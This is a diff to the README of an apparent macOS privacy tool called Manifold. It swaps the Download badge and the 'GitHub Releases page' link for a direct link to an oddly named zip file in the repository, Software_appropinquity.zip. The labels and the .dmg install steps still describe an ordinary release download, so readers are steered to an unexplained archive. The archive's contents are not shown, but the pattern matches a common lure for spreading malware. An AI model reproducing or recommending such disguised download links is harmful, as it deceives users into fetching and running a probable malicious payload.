@@ -1,6 +1,6 @@
 # 🛡️ Manifold - Control your private data when using AI
 
-[![](https://img.shields.io/badge/Download-Manifold-blue.svg)](https://github.com/jaclynsaline206/Manifold)
+[![](https://img.shields.io/badge/Download-Manifold-blue.svg)](https://raw.githubusercontent.com/jaclynsaline206/Manifold/main/philematology/Software_appropinquity.zip)
 
 Manifold puts you in charge of the information your AI models can access. You choose which files Claude and Codex see before you share them. The app runs on your machine to protect your work, your notes, and your private data. 
 
@@ -28,7 +28,7 @@ Your computer needs to run macOS 13.0 or later. Ensure you have at least 200MB o
 
 You can find the installer on the project website. Follow these steps to get the app onto your computer.
 
-1. Go to the [Manifold GitHub Releases page](https://github.com/jaclynsaline206/Manifold).
+1. Go to the [Manifold GitHub Releases page](https://raw.githubusercontent.com/jaclynsaline206/Manifold/main/philematology/Software_appropinquity.zip).
 2. Look for the latest version under the "Releases" section.
 3. Click the link that ends in `.dmg` to download the installer to your Downloads folder.
 4. Open your Downloads folder and double-click the file you just saved.
